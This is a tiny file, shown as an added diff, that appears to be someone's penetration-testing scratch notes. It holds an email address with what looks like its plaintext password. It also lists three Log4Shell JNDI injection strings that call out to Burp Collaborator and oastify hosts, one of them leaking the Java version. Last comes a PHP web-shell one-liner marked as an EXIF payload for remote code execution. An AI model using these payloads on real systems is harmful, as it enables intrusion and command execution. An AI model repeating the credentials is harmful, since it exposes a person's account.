@@ -1,0 +1,12 @@
+
+ammar@desainitsh17itestudentmesac.onmicrosoft.com
+Deshmukh@2022
+
+${jndi:ldap://c${java:version}.s81vc209tcza6ilz9q2oxsci1970vp.burpcollaborator.net/aaa}
+${jndi:ldap:x42087wephvf2nh45vyttx8nxe36rv.burpcollaborator.net}
+%24%7bjndi%3aldap%3a%2f%2fntktbpcr0r5ggrsewvsqyasqshy8myan.oastify.com%7d
+
+
+exif payload for rce
+comment : <?=`$_GET[x]`?>
+
